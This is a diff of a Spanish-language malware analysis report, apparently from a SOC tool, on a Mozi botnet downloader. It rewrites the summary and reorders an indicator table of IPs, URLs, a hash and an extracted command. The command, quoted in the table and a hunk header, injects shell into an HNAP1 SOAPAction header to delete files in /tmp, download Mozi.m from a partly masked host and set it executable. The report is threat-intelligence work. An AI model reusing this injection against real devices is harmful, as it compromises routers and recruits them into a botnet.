@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with very long lines (531), with CRLF line terminators de 794 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.m` en `hxxp://115.230.91.XXX:47206/Mozi.m`. Se extrajeron 5 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -51,15 +52,15 @@ SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 115.230.91.XXX | static_analysis |
-| ip | 190.179.164.XXX | static_analysis |
 | url | hxxp://115.230.91.XXX:47206/Mozi.m | strings |
-| url | hxxp://purenetworks[.]com/HNAP1/ | strings |
 | url | hxxp://schemas[.]xmlsoap[.]org/soap/envelope/ | strings |
 | url | hxxp://www[.]w3[.]org/2001/XMLSchema | strings |
 | url | hxxp://www[.]w3[.]org/2001/XMLSchema-instance | strings |
-| hash | ea14a1f29e8dcb63b3cd4df90f8c571ee9ae4969d6f1e54174b440ef63b7cb7d | static_analysis |
+| url | hxxp://purenetworks[.]com/HNAP1/ | strings |
+| ip | 190.179.164.XXX | static_analysis |
+| ip | 115.230.91.XXX | static_analysis |
 | command | SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://115.230.91.XXX:47206/Mozi.m && chmod 777 /t | strings |
+| hash | ea14a1f29e8dcb63b3cd4df90f8c571ee9ae4969d6f1e54174b440ef63b7cb7d | static_analysis |
 
 ## 🛡️ Nota de publicación
 
